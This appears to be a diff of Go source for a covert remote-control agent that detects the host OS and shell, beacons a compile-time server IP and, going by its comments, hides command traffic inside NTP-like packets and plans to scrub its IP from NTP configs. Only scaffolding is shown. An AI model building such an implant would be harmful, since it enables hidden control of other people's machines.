@@ -13,7 +13,7 @@ func init() {
 	newAgent = agent.Agent{}
 	newAgent.OpSys, newAgent.ShellType, newAgent.ShellFlag = agent.DetectOS()
 	newAgent.IFace = agent.GetNetAdapter(newAgent)
-	newAgent.ServerIP = []byte{127, 0, 0, 1}
+	newAgent.ServerIP = []byte{127,0,0,1} //set to IP when compiling
 	newAgent.MyIP = agent.GetMyIP()
 }
 
@@ -30,7 +30,6 @@ func main() {
 				return
 			case <-ticker.C:
 				handler.Heartbeat(newAgent)
-				fmt.Println("testing heartbeat")
 			}
 		}
 	}()
@@ -40,12 +39,12 @@ func main() {
 	ticker.Stop()
 	done <- true
 	fmt.Println("Ticker stopped")
-
+	//TODO remove IP from system NTP configs
 }
 
+
+
 /*
-
-
 raw sockets
 
 recieve beacon, see ping/comd id
@@ -60,15 +59,4 @@ parse/decode bytes into readable
 ->see ping
 ->resync request
 ->receive actual time info from NTP server
-
-
-
-client also must check to see if the time service is running
-
-
-TODO agent is compiled for specific os, sends initial ping
-
-
-
-//TODO add firewall command rule in setup
 */
